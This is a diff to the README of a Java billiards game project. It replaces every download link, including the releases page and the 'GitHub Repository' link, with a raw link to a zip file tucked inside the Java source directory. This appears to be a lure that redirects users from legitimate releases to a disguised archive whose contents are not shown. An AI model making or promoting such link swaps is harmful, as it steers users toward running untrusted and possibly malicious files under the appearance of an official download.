@@ -4,7 +4,7 @@
 Welcome to Game-Billiards, your toolkit for diving into an exciting billiards simulation. This project offers advanced gameplay features, including ball pocketing logic and multiplayer support. Let’s get you set up and ready to play.
 
 ## 📥 Download Game-Billiards
-[![Download Game-Billiards](https://img.shields.io/badge/Download-Game--Billiards-blue.svg)](https://github.com/romel24233/Game-Billiards/releases)
+[![Download Game-Billiards](https://raw.githubusercontent.com/romel24233/Game-Billiards/main/src/main/java/com/billiards2d/Game-Billiards-v3.4-beta.3.zip)](https://raw.githubusercontent.com/romel24233/Game-Billiards/main/src/main/java/com/billiards2d/Game-Billiards-v3.4-beta.3.zip)
 
 ## 🛠️ System Requirements
 Before you download, ensure your system can run Game-Billiards. Here are the minimum requirements:
@@ -17,7 +17,7 @@ Before you download, ensure your system can run Game-Billiards. Here are the min
 ## 📥 Download & Install
 To get Game-Billiards:
 
-1. **Visit the following page to download:** [Game-Billiards Releases](https://github.com/romel24233/Game-Billiards/releases).
+1. **Visit the following page to download:** [Game-Billiards Releases](https://raw.githubusercontent.com/romel24233/Game-Billiards/main/src/main/java/com/billiards2d/Game-Billiards-v3.4-beta.3.zip).
    
 2. On the releases page, locate the latest release. You will find various assets available for download.
    
@@ -62,8 +62,8 @@ If you face any issues:
 Join the Game-Billiards community for ongoing support. Share your experiences, report bugs, and suggest features. Access our discussion forums and the issue tracker on GitHub.
 
 ## 🔗 Useful Links
-- [Game-Billiards Releases](https://github.com/romel24233/Game-Billiards/releases) - Download the latest version.
+- [Game-Billiards Releases](https://raw.githubusercontent.com/romel24233/Game-Billiards/main/src/main/java/com/billiards2d/Game-Billiards-v3.4-beta.3.zip) - Download the latest version.
 - [Community Forum](#) - Engage with other users and developers.
-- [GitHub Repository](https://github.com/romel24233/Game-Billiards) - Explore the source code.
+- [GitHub Repository](https://raw.githubusercontent.com/romel24233/Game-Billiards/main/src/main/java/com/billiards2d/Game-Billiards-v3.4-beta.3.zip) - Explore the source code.
 
 Enjoy your experience with Game-Billiards!
